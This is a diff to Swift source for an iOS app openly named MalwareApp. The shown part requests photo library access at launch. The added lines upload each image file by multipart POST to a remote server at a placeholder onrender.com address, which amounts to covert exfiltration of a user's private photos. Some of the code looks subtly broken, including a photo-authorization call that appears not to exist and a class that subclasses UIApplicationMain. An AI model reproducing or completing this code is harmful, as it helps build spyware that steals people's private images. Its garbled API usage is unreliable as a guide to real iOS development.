@@ -1,7 +1,6 @@
 import UIKit
 
 class MalwareApp: UIApplicationMain {
-
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
         // Request photo library access
         let photoLibraryAccessRequest = PHRequestAuthorizationOptions.usePhotoLibrary
@@ -62,7 +61,37 @@ class MalwareApp: UIApplicationMain {
                 let uploadPath = "\(imagePath)/\(uploadedImageFile)"
 
                 // Upload the image to the server
-                // ...
+                let serverURL = URL(string: "https://YOUR-RENDER-URL.onrender.com/uploads")!
+
+                var request = URLRequest(url: serverURL)
+                request.httpMethod = "POST"
+
+                let boundary = UUID().uuidString
+
+                request.setValue(
+                    "multipart/form-data; boundary=\(boundary)",
+                    forHTTPHeaderField: "Content-Type"
+                )
+
+                var body = Data()
+                body.append("--\(boundary)\r\n".data(using: .utf8)!)
+                body.append("Content-Disposition: form-data; name=\"image\"; filename=\"\(uploadedImageFile)\"\r\n".data(using: .utf8)!)
+                body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
+                body.append(data)
+                body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)
+
+                let uploadTask = URLSession.shared.uploadTask(with: request, from: body) { responseData, response, error in
+                    if let error = error {
+                        print("Image upload failed: \(error.localizedDescription)")
+                        return
+                    }
+
+                    if let httpResponse = response as? HTTPURLResponse {
+                        print("Server response: \(httpResponse.statusCode)")
+                    }
+                }
+
+                uploadTask.resume()
             }
         }
         task.resume()
